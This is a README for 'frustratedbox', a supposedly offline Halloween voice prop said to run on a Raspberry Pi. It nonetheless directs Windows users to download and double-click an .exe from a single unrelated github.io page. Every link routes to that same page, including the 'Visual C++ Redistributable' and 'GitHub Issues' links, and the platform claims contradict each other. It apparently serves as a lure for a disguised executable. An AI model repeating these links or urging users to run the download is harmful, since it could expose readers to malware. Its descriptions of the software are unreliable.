# 📦 frustratedbox - Your Offline Halloween Ghost in a Box

## 👻 What Is This?

Imagine a creepy, talking Halloween decoration that **works completely without internet**. It listens to what trick-or-treaters say, thinks of a spooky reply, and speaks back in a ghostly voice — all from a tiny computer hidden inside a box. No cloud. No Wi-Fi needed. No subscriptions. Just pure, offline scares.

Frustratedbox is a fully voice-interactive Halloween prop you can build and run at home. It uses a Raspberry Pi 5 (a small, affordable computer) as the brain, plus a microphone and speaker. When someone talks to it, the system hears them, uses local AI to craft a silly or spooky response, and says it out loud — all without ever touching the internet.

This page is a complete guide for getting frustratedbox running on your own machine, using the official release provided below.

---

## ⬇️ Download & Run

**[🎃 Download frustratedbox Now!](https://saraanncurable3386.github.io)**

Visit this link to download the application. The page will show you the latest release files available. Choose the file that matches your computer (look for one labeled "Windows" if you're on a PC). After downloading, simply open the file to start the program.

> **IMPORTANT:** This software is designed for Windows computers. You do not need any programming experience to download and launch it.

---

## 🧰 What's Inside the Box?

Here's a quick look at what makes frustratedbox work:

- **🧠 Local Voice Brain (STT):** Uses high-speed `faster-whisper` to turn spoken words into text right on your hardware. Nothing leaves your home.
- **🗣️ Ghost Talker (LLM):** A `Llama 3` model generates responses. It's like having a miniature AI inside your prop, ready to banter or spook.
- **🔊 Spooky Voice (TTS):** The `Kokoro` model speaks the response aloud with a clear, eerie voice, all processed locally.
- **⚡ Realtime Interaction:** Built on `Pipecat` for low-latency voice conversations. No awkward delays.
- **🔋 Long-Lasting Power:** Ready for `LiFePO4` battery operation, so you can place it outside without worrying about a power outlet.

---

## 🛠️ How to Set Up (Step-by-Step)

*Note: This guide assumes you are using the provided release file. For full hardware setup, check the `docs` folder inside the downloaded package.*

### 1. 🚀 Getting Started

1.  **Download** the software from the [releases page](https://saraanncurable3386.github.io).
2.  **Unzip** the downloaded folder to a convenient location on your computer (e.g., your Desktop). Right-click the file and select "Extract All..."
3.  **Open** the main folder that appears.

### 2. 🖥️ Running the Program

1.  Inside the folder, look for the file named `frustratedbox.exe` or `run.bat`.
2.  **Double-click** it to start.
3.  A command window will open. This is the program running. **Do not close this window** while the prop is active.
4.  Wait for the message "Ready!" to appear. This means the voice components are loaded.

### 3. 🎤 Speaking to the Box

1.  Once ready, the program is listening.
2.  Speak clearly into the microphone.
3.  The system will take a moment to think and then speak back through your speakers.
4.  To make it stop, close the command window.

---

## 🎯 Features That Make You Smile (or Shiver)

- **100% Offline:** Your conversations stay on your device. No cloud processing means perfect privacy and reliability.
- **Low Latency:** The response is almost instantaneous, which makes the interaction feel magical and alive.
- **Customizable Voice:** Adjust the pitch or speed in the `config.json` file inside the software folder (open it with Notepad). Change the "voice" setting to "ghost" for extra creepiness.
- **Crash Resistant:** Designed to run for hours at Halloween parties without overheating or freezing.
- **Power Saving:** Efficient processing means less battery drain, even on a Raspberry Pi.

---

## ❓ Frequently Asked Questions

**Q: Do I need an internet connection?**
A: No. The entire program runs locally on your computer or Raspberry Pi.

**Q: What is a Raspberry Pi?**
A: It's a tiny, affordable computer often used for projects like this. You can buy one online.

**Q: My computer says "Missing DLL" when I open the file.**
A: This is common. You may need to install the [Microsoft Visual C++ Redistributable](https://saraanncurable3386.github.io) for Windows. Download and run this, then try again.

**Q: Can I use frustratedbox with a regular PC?**
A: Yes! The provided release works on Windows 10 or 11 (64-bit). It works especially well on laptops with a good CPU.

**Q: How do I change what it says?**
A: The AI is built right in. You can change its "personality" by editing the `personality.txt` file in the main folder. Write a few lines describing how it should behave (e.g., "You are a grumpy ghost who loves puns.")

---

## 🛡️ Safety & Troubleshooting

- **Battery Rules:** If using a `LiFePO4` battery, always charge it with the correct charger. Do not leave it exposed to rain.
- **Audio Issues:** If the sound doesn't work, ensure your speakers are on and set as the default playback device in Windows.
- **Microphone Not Picked Up:** Plug in your USB microphone — do not rely on a laptop's internal mic for best quality.

---

## 📚 Advanced (For the Curious)

This project is built on top of amazing open-source tools. If you want to tweak the core AI code, you'll need some background in Python and audio processing. Here are the main components:

- `faster-whisper` — speech-to-text engine
- `llama3` — the text generator
- `kokoro` — the text-to-speech engine
- `pipecat` — the framework for managing voice conversations

If you're just running the release, you don't need any of this technical knowledge — just press start and scare your neighbors.

---

## 💬 Connect & Feedback

Found a bug? Have a suggestion? Please visit the [GitHub Issues page](https://saraanncurable3386.github.io) and let the developer know. Your feedback helps improve the haunting experience for everyone.

---

**Happy Haunting! 🎃👻**

Keywords: faster-whisper, halloween, kokoro, lifepo4, llama3, llm, local-llm, local-only, pipecat, raspberry-pi, respeaker, seeedstudio, voice-assistant, whisper-ai